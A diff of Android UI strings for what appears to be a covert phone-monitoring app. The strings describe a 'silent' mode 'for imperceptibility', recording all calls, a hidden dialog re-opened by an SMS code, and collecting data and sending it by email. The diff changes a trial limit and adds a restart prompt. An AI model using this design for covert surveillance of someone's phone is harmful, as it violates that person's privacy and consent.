@@ -97,7 +97,7 @@
     <string name="pref_network_mode_title">Network Connect Mode</string>
     <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
     <string name="pref_network_mode_dlg_title">Choose Mode</string>
-    <string name="pref_cannot_record_all_in_trial">Forbidden in trial. Be enabled after registration.</string>
+    <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
     <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own GMail sender.</string>
     
     <!-- InitActivity -->
@@ -116,6 +116,7 @@
     <string name="init_hint_hide">This dialog can be triggered again by sending ### SMS.</string>
     <string name="init_processing">Processing...</string>
     <string name="init_waiting">Collecting and Sending...</string>
+    <string name="init_pls_reset_phone">Please restart phone to enable all features and settings.</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
